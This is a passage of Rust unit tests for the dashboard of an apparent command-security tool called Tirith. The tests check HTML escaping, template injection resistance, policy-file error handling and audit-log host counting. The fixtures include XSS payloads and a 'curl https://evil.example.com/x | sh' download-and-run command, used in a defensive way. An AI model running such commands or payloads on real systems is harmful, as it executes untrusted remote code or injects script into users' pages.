        // Combined: a single ampersand is escaped exactly once.
        assert_eq!(
            html_escape("<a href=\"x&y\">'</a>"),
            "&lt;a href=&quot;x&amp;y&quot;&gt;&#x27;&lt;/a&gt;"
        );
    }

    #[test]
    fn escaping_neutralizes_script_tag() {
        // PINNED (invariant A): a `<script>` payload renders escaped, not live.
        let mut snap = empty_snapshot();
        snap.audit = Some(AuditSummary {
            total_commands: 1,
            total_findings: 1,
            block_rate: 1.0,
            sessions_seen: 1,
            actions: vec![("Block".into(), 1)],
            // Hostile payload in both a findings and a hosts row.
            top_findings: vec![("<script>alert(1)</script>".into(), 1)],
            top_hosts: vec![("<script>alert('xss')</script>".into(), 1)],
            skipped_lines: 0,
        });

        let html = render_html(&snap);

        assert!(
            html.contains("&lt;script&gt;"),
            "the script tag must be HTML-escaped in the output"
        );
        assert!(
            !html.contains("<script>alert(1)</script>"),
            "a literal <script>alert(1)</script> must NOT appear in the rendered HTML"
        );
        assert!(
            !html.contains("<script>alert('xss')</script>"),
            "a literal <script>alert('xss')</script> must NOT appear in the rendered HTML"
        );
        // The single-quote in the host payload is escaped numerically.
        assert!(
            html.contains("&#x27;xss&#x27;"),
            "single quotes in attacker bytes must be escaped as &#x27;"
        );
    }

    #[test]
    fn snapshot_value_with_literal_marker_is_escaped_not_expanded() {
        // PINNED (CodeRabbit M13 R2): a snapshot value containing a literal
        // marker must be emitted verbatim, not expanded into that section. The
        // single-pass expander never re-scans output (the old loop did).
        let mut snap = empty_snapshot();
        // generated_at maps to `{{GENERATED_AT}}`; smuggle a marker + sentinel.
        snap.generated_at = "SENTINEL_PRE {{HOOK_SECTION}} SENTINEL_POST".into();

        let html = render_html(&snap);

        // Braces survive html_escape, so the marker text appears once verbatim.
        assert_eq!(
            html.matches("SENTINEL_PRE {{HOOK_SECTION}} SENTINEL_POST")
                .count(),
            1,
            "the injected marker text must appear once, verbatim and un-expanded"
        );
        // The real hook section renders exactly ONCE — the injected copy did
        // not spawn a second hook pill.
        assert_eq!(
            html.matches(r#"<span class="pill pill-off">not installed</span>"#)
                .count(),
            1,
            "the injected marker must not have been expanded into a 2nd hook section"
        );
    }

    #[test]
    fn render_html_has_no_unreplaced_placeholders() {
        // Every `{{…}}` marker in the template must be substituted — an
        // unreplaced marker would mean a section silently rendered nothing.
        let html = render_html(&empty_snapshot());
        assert!(
            !html.contains("{{"),
            "no template placeholder may survive rendering: {html}"
        );
        // The template must remain self-contained: no external resource loads.
        let lower = html.to_ascii_lowercase();
        assert!(!lower.contains("http://"), "no external http resource");
        assert!(!lower.contains("https://"), "no external https resource");
        assert!(!lower.contains("<script"), "no <script> element at all");
        assert!(
            !lower.contains("src=") && !lower.contains("href="),
            "no src=/href= external references"
        );
    }

    #[test]
    fn expand_template_edge_cases() {
        // Adjacent markers each substitute independently in one pass.
        assert_eq!(
            expand_template(
                "{{A}}{{B}}",
                &[("{{A}}", "x".into()), ("{{B}}", "y".into())]
            ),
            "xy",
            "adjacent markers each expand once"
        );

        // An unterminated `{{` is emitted verbatim, never treated as a marker.
        assert_eq!(
            expand_template("pre {{UNCLOSED", &[("{{UNCLOSED}}", "z".into())]),
            "pre {{UNCLOSED",
            "unterminated marker is literal trailing text"
        );

        // An UNKNOWN marker (not in `subs`) passes through unchanged.
        assert_eq!(
            expand_template("a {{UNKNOWN}} b", &[("{{KNOWN}}", "v".into())]),
            "a {{UNKNOWN}} b",
            "unknown marker is passed through verbatim"
        );

        // Security property: a substituted value containing a marker is NOT
        // re-expanded (the boundary that stops template/XSS injection).
        assert_eq!(
            expand_template(
                "{{A}}",
                &[
                    ("{{A}}", "{{B}}".into()),
                    ("{{B}}", "SHOULD_NOT_APPEAR".into())
                ]
            ),
            "{{B}}",
            "a marker inside a substituted value is NOT re-expanded (single pass)"
        );
    }

    #[test]
    fn unavailable_sections_render_gracefully() {
        // A fully-empty snapshot (no audit log, no threat DB) must still render a
        // complete document with the documented "unavailable" affordances.
        let html = render_html(&empty_snapshot());
        assert!(html.contains("No audit log found"));
        assert!(html.contains("Threat DB not installed"));
        assert!(html.contains("not installed")); // hook pill
        assert!(html.contains("Tirith Security Dashboard"));
    }

    #[test]
    fn snapshot_is_serde_round_trippable() {
        let snap = empty_snapshot();
        let json = serde_json::to_string(&snap).expect("serialize");
        // `schema_version` stays on the parent snapshot; the policy object is now
        // internally tagged on `state` with the values flattened in.
        assert!(
            json.contains("\"schema_version\":1"),
            "schema_version must remain on the parent snapshot: {json}"
        );
        assert!(
            json.contains("\"state\":\"no_file\""),
            "the policy object must carry the snake_case `state` tag: {json}"
        );
        let back: DashboardSnapshot = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(back.schema_version, snap.schema_version);
        assert_eq!(back.window_days, 7);
        // The empty snapshot's policy is the no-file/defaults state; the values are
        // flattened alongside the `state` tag.
        match back.policy {
            PolicySummary::NoFile { values } => {
                assert_eq!(values.fail_mode, "open");
                assert_eq!(values.paranoia, 1);
            }
            other => panic!("expected NoFile after round-trip, got {other:?}"),
        }
    }

    #[test]
    fn parse_error_variant_cannot_carry_numeric_values() {
        // The enum refactor's point: the "fail-open lie" state (error + populated
        // counts) is unrepresentable. `ParseError` has only `{path, error}` and
        // serializes none of the value keys (CodeRabbit M13 PR #132 R5-1).
        let err = PolicySummary::ParseError {
            path: "/repo/.tirith/policy.yaml".into(),
            error: "boom".into(),
        };
        let json = serde_json::to_value(&err).expect("serialize");
        let obj = json.as_object().expect("a tagged-enum struct object");
        assert_eq!(
            obj.get("state").and_then(|v| v.as_str()),
            Some("parse_error")
        );
        for k in [
            "paranoia",
            "fail_mode",
            "allowlist_count",
            "allowlist_rules_count",
            "blocklist_count",
            "custom_rules_count",
        ] {
            assert!(
                !obj.contains_key(k),
                "the ParseError state must not carry the numeric value key {k:?}: {obj:?}"
            );
        }
        // It carries exactly the three keys it should: the `state` tag, the path,
        // and the error — nothing that could be mistaken for a benign default.
        assert_eq!(
            obj.len(),
            3,
            "ParseError serializes to {{state, path, error}} only: {obj:?}"
        );

        // The populated states DO carry the value keys and round-trip correctly.
        let valid = PolicySummary::Valid {
            path: "/repo/.tirith/policy.yaml".into(),
            values: PolicyValues {
                paranoia: 3,
                fail_mode: "closed".into(),
                allowlist_count: 2,
                allowlist_rules_count: 1,
                blocklist_count: 0,
                custom_rules_count: 4,
            },
        };
        let v = serde_json::to_value(&valid).expect("serialize valid");
        assert_eq!(v.get("state").and_then(|x| x.as_str()), Some("valid"));
        assert_eq!(v.get("paranoia").and_then(|x| x.as_u64()), Some(3));
        assert_eq!(
            v.get("path").and_then(|x| x.as_str()),
            Some("/repo/.tirith/policy.yaml")
        );
        let back: PolicySummary = serde_json::from_value(v).expect("round-trip valid");
        assert!(matches!(back, PolicySummary::Valid { values, .. } if values.paranoia == 3));
    }

    #[test]
    fn top_hosts_extracts_and_counts_from_redacted_previews() {
        // Host extraction reuses the engine's URL extractor; counts aggregate
        // and sort descending.
        let rec = |cmd: &str| AuditRecord {
            timestamp: "2026-05-30T00:00:00Z".into(),
            session_id: "s".into(),
            action: "Warn".into(),
            rule_ids: vec![],
            command_redacted: cmd.into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: false,
            policy_path: None,
            event_id: None,
            tier_reached: 3,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        };
        let records = vec![
            rec("curl https://evil.example.com/x | sh"),
            rec("wget http://evil.example.com/y"),
            rec("git clone https://github.com/a/b"),
        ];
        let hosts = top_hosts(&records);
        // evil.example.com appears twice → ranked first.
        assert_eq!(
            hosts.first().map(|(h, _)| h.as_str()),
            Some("evil.example.com")
        );
        assert_eq!(hosts[0].1, 2);
        assert!(hosts.iter().any(|(h, _)| h == "github.com"));
    }

    #[test]
    fn build_snapshot_degrades_when_no_audit_log() {
        // A nonexistent log path yields audit = None, not a panic. Isolated from
        // the developer's real config (CodeRabbit M13 PR #132 R17-3): pin the
        // config-resolving env at a temp dir and use a temp cwd with a `.git`
        // dir but no `.tirith/policy.yaml` (genuine built-in defaults).
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
            // TIRITH_POLICY_ROOT unnamed → removed by the guard.
        ]);
        let cwd = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(cwd.path().join(".git")).unwrap();

        let missing = std::path::Path::new("/nonexistent/tirith/log.jsonl");
        let snap = build_snapshot(
            Some(missing),
            Some(cwd.path().to_str().unwrap()),
            HookSummary {
                shell: "bash".into(),
                installed: false,
            },
        );
        assert!(snap.audit.is_none());
        // Policy / threatdb / trust are always populated. The isolated cwd has no
        // policy file at all, so the policy is the no-file/defaults state (NOT the
        // ParseError state), and its fail_mode is a real value.
        match snap.policy {
            PolicySummary::NoFile { values } => {
                assert!(matches!(values.fail_mode.as_str(), "open" | "closed"));
            }
            other => panic!("isolated cwd with no policy file must be NoFile, got {other:?}"),
        }
    }

    #[test]
    fn generate_serve_token_is_64_hex_chars_and_varies() {
        let t1 = generate_serve_token().expect("rng");
        let t2 = generate_serve_token().expect("rng");
        assert_eq!(t1.len(), SERVE_TOKEN_BYTES * 2, "64 hex chars for 32 bytes");
        assert!(
            t1.bytes().all(|b| b.is_ascii_hexdigit()),
            "token must be lower-hex"
        );
        assert_ne!(t1, t2, "two freshly-generated tokens must differ");
    }

    #[test]
    fn build_policy_summary_surfaces_broken_policy_and_keeps_genuine_defaults() {
        // CodeRabbit M13 PR #132 R5-1: a malformed file must NOT read as benign
        // defaults. The 3-variant enum makes the state unambiguous (broken →
        // ParseError, no file → NoFile, valid → Valid) and the "error + numbers"
        // state unrepresentable. Env isolated + restored via TEST_ENV_LOCK.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
            // TIRITH_POLICY_ROOT / TIRITH_SERVER_URL / TIRITH_API_KEY unnamed →
            // removed by the guard.
        ]);

        // (1) Present-but-unparseable policy file → error surfaced, no defaults.
        let broken = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(broken.path().join(".git")).unwrap();
        std::fs::create_dir_all(broken.path().join(".tirith")).unwrap();
        // Unterminated flow sequence — a hard YAML syntax error.
        std::fs::write(
            broken.path().join(".tirith/policy.yaml"),
            "paranoia: [unterminated\n",
        )
        .unwrap();
        let summary = build_policy_summary(Some(broken.path().to_str().unwrap()));
        // Malformed file → ParseError (no numeric values), still reporting which
        // file failed.
        match summary {
            PolicySummary::ParseError { path, error } => {
                assert!(!error.is_empty(), "the parse error must be surfaced");
                assert!(
                    !path.is_empty(),
                    "the path of the file that failed to parse must still be reported"
                );
            }
            other => panic!(
                "a malformed policy file must surface ParseError, not silent defaults: {other:?}"
            ),
        }

        // (2) NO policy file anywhere → genuine built-in defaults (NoFile).
        let none_dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(none_dir.path().join(".git")).unwrap();
        let summary = build_policy_summary(Some(none_dir.path().to_str().unwrap()));
        match summary {
            PolicySummary::NoFile { values } => {
                assert_eq!(
                    values.paranoia, 1,
                    "no policy file → built-in default paranoia tier 1"
                );
                assert_eq!(
                    values.fail_mode, "open",
                    "no policy file → built-in default fail mode open"
                );
                assert_eq!(values.custom_rules_count, 0);
            }
            other => panic!("absence of a policy file must be NoFile, not an error: {other:?}"),
        }

        // (3) Valid policy file → parsed values (Valid), path set.
        let valid = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(valid.path().join(".git")).unwrap();
        std::fs::create_dir_all(valid.path().join(".tirith")).unwrap();
        std::fs::write(
            valid.path().join(".tirith/policy.yaml"),
            "paranoia: 3\nfail_mode: closed\n",
        )
        .unwrap();
        let summary = build_policy_summary(Some(valid.path().to_str().unwrap()));
        match summary {
            PolicySummary::Valid { path, values } => {
                assert_eq!(values.paranoia, 3);
                assert_eq!(values.fail_mode, "closed");
                assert!(!path.is_empty(), "a valid policy reports its path");
            }
            other => panic!("a valid policy file must be Valid, got {other:?}"),
        }

        // `_env` restores the full env set on drop — no manual cleanup needed.
    }

    #[test]
    fn build_policy_summary_non_regular_policy_yields_safe_error() {
        // CodeRabbit M13 PR #132 R23: a NON-REGULAR policy path (here a directory)
        // must surface the fail-closed error state via `read_regular_capped`'s
        // `NotRegularFile` rejection — not panic, not benign defaults. Env
        // isolated as the sibling broken-policy test.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        // The policy "file" is a directory — a non-regular path.
        std::fs::create_dir_all(repo.path().join(".tirith/policy.yaml")).unwrap();

        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));
        // Non-regular path → fail-closed ParseError (no value fields to leak).
        let (path, err) = match summary {
            PolicySummary::ParseError { path, error } => (path, error),
            other => panic!(
                "a non-regular policy path must surface ParseError, not benign defaults: {other:?}"
            ),
        };
        // Unix: the fstat check yields "not a regular file". Windows: open fails
        // with a different OS error — also fail-closed. Only the exact message
        // is Unix-specific; the fail-closed contract is asserted above.
        #[cfg(unix)]
        assert!(
            err.contains("not a regular file"),
            "the error should explain the non-regular rejection; got {err:?}"
        );
        #[cfg(not(unix))]
        assert!(
            !err.is_empty(),
            "the non-regular path must surface a non-empty fail-closed error; got {err:?}"
        );
        assert!(
            !path.is_empty(),
            "the path that failed to load must still be reported"
        );
        // `_env` restores the full env set on drop.
    }

    #[test]
    fn build_policy_summary_oversized_policy_yields_safe_error() {
        // CodeRabbit M13 PR #132 R23: an oversized policy file (> POLICY_READ_CAP)
        // is refused before buffering, surfacing the fail-closed error state. One
        // byte past the cap.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        // One byte over the cap, otherwise valid padding (rejection is on SIZE).
        let oversized = vec![b' '; (POLICY_READ_CAP as usize) + 1];
        std::fs::write(repo.path().join(".tirith/policy.yaml"), &oversized).unwrap();

        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));
        let (path, err) = match summary {
            PolicySummary::ParseError { path, error } => (path, error),
            other => panic!(
                "an oversized policy file must be rejected (ParseError), \
                 not buffered and parsed: {other:?}"
            ),
        };
        assert!(
            err.contains("exceeds read cap"),
            "the error should explain the size rejection; got {err:?}"
        );
        assert!(!path.is_empty());
        // `_env` restores the full env set on drop.
    }

    /// CodeRabbit M13 PR #132 R23: a FIFO at the policy path would block a plain
    /// read forever; `read_regular_capped` (O_NONBLOCK) rejects it so this
    /// returns promptly with the fail-closed error state. A regression would HANG
    /// (suite timeout). Unix-only (needs `mkfifo`).
    #[cfg(unix)]
    #[test]
    fn build_policy_summary_fifo_policy_does_not_hang() {
        use std::ffi::CString;
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        let fifo = repo.path().join(".tirith/policy.yaml");
        let c_path = CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
        let rc = unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) };
        if rc != 0 {
            eprintln!("skipping: mkfifo unsupported here");
            return;
        }

        // Must complete promptly (a blocking read would hang) and surface the
        // fail-closed ParseError state.
        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));
        assert!(
            matches!(summary, PolicySummary::ParseError { .. }),
            "a FIFO at the policy path must surface ParseError (and not hang): {summary:?}"
        );
        // `_env` restores the full env set on drop.
    }

    #[test]
    fn count_trust_entries_non_regular_path_counts_zero() {
        // CodeRabbit M13 PR #132 R23: a non-regular trust.json (here a directory)
        // collapses to the same zero-count path a missing file takes — never a
        // panic or hang.
        let dir = tempfile::tempdir().unwrap();
        let trust = dir.path().join("trust.json");
        std::fs::create_dir_all(&trust).unwrap();
        assert_eq!(
            count_trust_entries(&trust),
            0,
            "a non-regular trust.json must count as zero (safe), not panic"
        );
    }

    #[test]
    fn count_trust_entries_oversized_path_counts_zero() {
        // CodeRabbit M13 PR #132 R23: an oversized trust.json (> TRUST_READ_CAP)
        // is refused before buffering and counts as zero.
        let dir = tempfile::tempdir().unwrap();
        let trust = dir.path().join("trust.json");
        let oversized = vec![b' '; (TRUST_READ_CAP as usize) + 1];
        std::fs::write(&trust, &oversized).unwrap();
        assert_eq!(
            count_trust_entries(&trust),
            0,
            "an oversized trust.json must count as zero (refused before buffering)"
        );
    }

    #[test]
    fn build_audit_summary_reads_valid_log_through_capped_reader() {
        // Happy path: a real in-window log still produces a populated summary
        // after the capped-read refactor. Two verdict records → 2 commands; a
        // blank + a malformed line exercise `parse_log`'s skipped_lines counting.
        let mut rec = AuditRecord {
            timestamp: "2026-05-30T00:00:00Z".into(),
            session_id: "s1".into(),
            action: "Warn".into(),
            rule_ids: vec!["plain_http".into()],
            command_redacted: "wget http://evil.example.com/y".into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: false,
            policy_path: None,
            event_id: None,
            tier_reached: 3,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        };
        let line1 = serde_json::to_string(&rec).unwrap();
        rec.action = "Block".into();
        rec.command_redacted = "curl https://evil.example.com/x | sh".into();
        let line2 = serde_json::to_string(&rec).unwrap();
        let log_body = format!("{line1}\n\n{line2}\nnot-json-at-all\n");

        let dir = tempfile::tempdir().unwrap();
        let log = dir.path().join("log.jsonl");
        std::fs::write(&log, log_body).unwrap();

        let summary =
            build_audit_summary(Some(&log), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z")
                .expect("a valid in-window log must produce a populated summary");
        assert_eq!(
            summary.total_commands, 2,
            "both verdict records inside the window are counted"
        );
        assert_eq!(
            summary.skipped_lines, 1,
            "the one malformed line is skipped and accounted for (blank lines are not)"
        );
        assert!(
            summary
                .top_hosts
                .iter()
                .any(|(h, _)| h == "evil.example.com"),
            "the redacted previews' host is tallied; got {:?}",
            summary.top_hosts
        );
    }

    #[test]
    fn build_audit_summary_non_regular_path_degrades_to_none() {
        // CodeRabbit M13 PR #132: a non-regular audit-log path (here a directory)
        // collapses to the same `None` degrade a missing log takes, never a panic.
        let dir = tempfile::tempdir().unwrap();
        let log = dir.path().join("log.jsonl");
        std::fs::create_dir_all(&log).unwrap();
        let summary =
            build_audit_summary(Some(&log), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z");
        assert!(
            summary.is_none(),
            "a non-regular audit log must degrade to None (safe), not panic"
        );
    }

    #[test]
    fn build_audit_summary_oversized_log_degrades_to_none() {
        // CodeRabbit M13 PR #132: an oversized log (> AUDIT_READ_CAP) is refused
        // before buffering, so the summary degrades to `None`. One byte over the
        // cap, with valid-ish bytes (rejection is on SIZE, not parse failure).
        let dir = tempfile::tempdir().unwrap();
        let log = dir.path().join("log.jsonl");
        let oversized = vec![b'\n'; (AUDIT_READ_CAP as usize) + 1];
        std::fs::write(&log, &oversized).unwrap();
        let summary =
            build_audit_summary(Some(&log), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z");
        assert!(
            summary.is_none(),
            "an oversized audit log must degrade to None (refused before buffering)"
        );
    }

    /// CodeRabbit M13 PR #132: a FIFO at the audit-log path would block a plain
    /// read forever; `read_regular_capped` (O_NONBLOCK) rejects it so this
    /// returns promptly with the `None` degrade. A regression would HANG.
    /// Unix-only (needs `mkfifo`).
    #[cfg(unix)]
    #[test]
    fn build_audit_summary_fifo_log_does_not_hang() {
        use std::ffi::CString;
        let dir = tempfile::tempdir().unwrap();
        let fifo = dir.path().join("log.jsonl");
        let c_path = CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
        let rc = unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) };
        if rc != 0 {
            eprintln!("skipping: mkfifo unsupported here");
            return;
        }
        // Must complete promptly (a blocking read would hang); degrades to None.
        let summary =
            build_audit_summary(Some(&fifo), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z");
        assert!(
            summary.is_none(),
            "a FIFO at the audit-log path must degrade to None (and not hang)"
        );
    }

    #[test]
    fn build_policy_summary_counts_include_effective_overlays() {
        // CodeRabbit M13 PR #132 R6-1: the dashboard must summarize the EFFECTIVE
        // policy (local parse PLUS the read-only overlays that append user/org
        // lists + trust entries to allow/block); the strict-local-only parse
        // under-reports. Here: 1 local allowlist entry + a user allowlist line,
        // an org blocklist line, and two trust entries (flat → allowlist,
        // rule-scoped → allowlist_rules). A broken local file is still the
        // hard-error state (asserted at the end).
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        // Point every config-resolving var at the isolated dir (XDG on
        // Linux/macOS, %APPDATA% on Windows) so the overlay files are seen on
        // every platform and the real config is never read.
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        // A valid local (REPO-scoped) policy. It carries an `allowlist` line, but
        // F9 NEUTRALIZES a repo-scoped allowlist (a repo checkout is attacker-
        // controllable and may tighten but not suppress), so that entry does NOT
        // reach the effective policy and is NOT counted below. `paranoia` is a
        // tightening field F9 preserves, so `paranoia: 2` still flows through.
        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        std::fs::write(
            repo.path().join(".tirith/policy.yaml"),
            "paranoia: 2\nallowlist:\n  - https://local.example.com\n",
        )
        .unwrap();

        // User-scope overlay: a flat allowlist line, planted where
        // `config_dir()` resolves under the isolated env.
        let user_tirith =
            crate::policy::config_dir().expect("config_dir resolves under the isolated env");
        std::fs::create_dir_all(&user_tirith).unwrap();
        std::fs::write(user_tirith.join("allowlist"), "https://user.example.com\n").unwrap();
        // User-scope trust store: one flat entry (→ allowlist) + one rule-scoped
        // entry (→ allowlist_rules), both permanent (`load_trust_entries`).
        let trust = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "https://trust-flat.example.com", "added": "x", "source": "s"},
                {"pattern": "https://trust-rule.example.com", "added": "x", "source": "s",
                 "rule_id": "plain_http"}
            ]
        });
        std::fs::write(
            user_tirith.join("trust.json"),
            serde_json::to_string(&trust).unwrap(),
        )
        .unwrap();

        // Org-scope overlay: a repo `.tirith/blocklist` line (`load_org_lists`).
        std::fs::write(
            repo.path().join(".tirith/blocklist"),
            "https://blocked.example.com\n",
        )
        .unwrap();

        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));

        // The local file parsed → Valid, carrying the effective (overlaid) values.
        let values = match summary {
            PolicySummary::Valid { values, .. } => values,
            other => panic!("a valid local policy + overlays must be Valid: {other:?}"),
        };
        assert_eq!(values.paranoia, 2, "local paranoia is preserved");

        // allowlist = 1 user flat-file + 1 flat trust entry = 2. The repo-local
        // allowlist entry is NOT counted: F9 neutralizes a repo-scoped allowlist
        // (the user flat-file and trust overlays are user-scoped, so they remain).
        // (Round 5's strict-local-only parse would have reported 0 overlays.)
        assert_eq!(
            values.allowlist_count, 2,
            "allowlist must include the user flat-file + flat trust overlays \
             (repo-local entry neutralized by F9): {values:?}"
        );
        // allowlist_rules = 1 rule-scoped trust entry.
        assert_eq!(
            values.allowlist_rules_count, 1,
            "rule-scoped trust entries must count toward allowlist_rules: {values:?}"
        );
        // blocklist = 1 org flat-file line.
        assert_eq!(
            values.blocklist_count, 1,
            "blocklist must include the org flat-file overlay: {values:?}"
        );

        // A broken local file is still the hard-error (ParseError) state even
        // with overlays present.
        std::fs::write(
            repo.path().join(".tirith/policy.yaml"),
            "paranoia: [unterminated\n",
        )
        .unwrap();
        let broken = build_policy_summary(Some(repo.path().to_str().unwrap()));
        assert!(
            matches!(broken, PolicySummary::ParseError { .. }),
            "a broken LOCAL file must still surface the ParseError state: {broken:?}"
        );

        // `_env` restores the full env set on drop — no manual cleanup needed.
    }

    #[test]
    fn build_policy_summary_never_fetches_remote_with_server_env_set() {
        // CodeRabbit M13 PR #132 R9-2: the dashboard must reflect the LOCAL
        // effective policy without a remote fetch, even with a policy server
        // configured. Control: the local file sets `policy_fetch_fail_mode:
        // closed` and the env names an UNREACHABLE server, so `Policy::discover`
        // would fail closed (paranoia None); observing local `paranoia: 3`
        // instead proves the offline path ran.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        // Pin config resolution at the isolated dir and name a bogus, unreachable
        // policy server. A stray `fetch_remote_policy` would flip the summary to
        // the error state or hang.
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
            (
                "TIRITH_SERVER_URL",
                Some(std::ffi::OsStr::new("http://127.0.0.1:1")),
            ),
            ("TIRITH_API_KEY", Some(std::ffi::OsStr::new("bogus-key"))),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        std::fs::write(
            repo.path().join(".tirith/policy.yaml"),
            "paranoia: 3\nfail_mode: closed\npolicy_fetch_fail_mode: closed\n",
        )
        .unwrap();

        // Must return promptly and reflect the LOCAL policy — no remote fetch.
        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));

        // The local file parsed → Valid (a remote fetch would have failed closed
        // and yielded ParseError).
        let values = match summary {
            PolicySummary::Valid { values, .. } => values,
            other => panic!(
                "offline discovery must yield the LOCAL Valid policy, \
                 not a fetch error: {other:?}"
            ),
        };
        assert_eq!(
            values.paranoia, 3,
            "the LOCAL paranoia must be reflected; a remote fetch would have \
             failed closed and yielded ParseError: {values:?}"
        );
        assert_eq!(
            values.fail_mode, "closed",
            "the LOCAL fail_mode must be reflected, not a fetched/remote value: {values:?}"
        );

        // `_env` restores the full env set on drop — no manual cleanup needed.
    }

    #[test]
    fn render_policy_shows_unavailable_for_broken_policy_escaped() {
        // The error state renders an "unavailable" notice (not fake defaults),
        // with path and error HTML-escaped.
        let p = PolicySummary::ParseError {
            path: "/repo/.tirith/<script>.yaml".into(),
            error: "yaml parse error: did not find expected <node>".into(),
        };
        let html = render_policy(&p);
        assert!(
            html.contains("Policy unavailable"),
            "the broken-policy state must say it is unavailable: {html}"
        );
        assert!(
            html.contains("yaml parse error"),
            "the parse error must be surfaced: {html}"
        );
        // No fake defaults leaked into the broken-policy rendering.
        assert!(
            !html.contains("Paranoia tier"),
            "a broken policy must NOT render the numeric default block"
        );
        // HTML-escaped path + error (no raw <script>).
        assert!(
            html.contains("&lt;script&gt;"),
            "path must be escaped: {html}"
        );
        assert!(
            !html.contains("<script>"),
            "no raw <script> may appear: {html}"
        );

        // Sanity: a normal (Valid) summary still renders the numeric block.
        let ok = PolicySummary::Valid {
            path: "/repo/.tirith/policy.yaml".into(),
            values: PolicyValues {
                paranoia: 2,
                fail_mode: "closed".into(),
                allowlist_count: 1,
                allowlist_rules_count: 0,
                blocklist_count: 0,
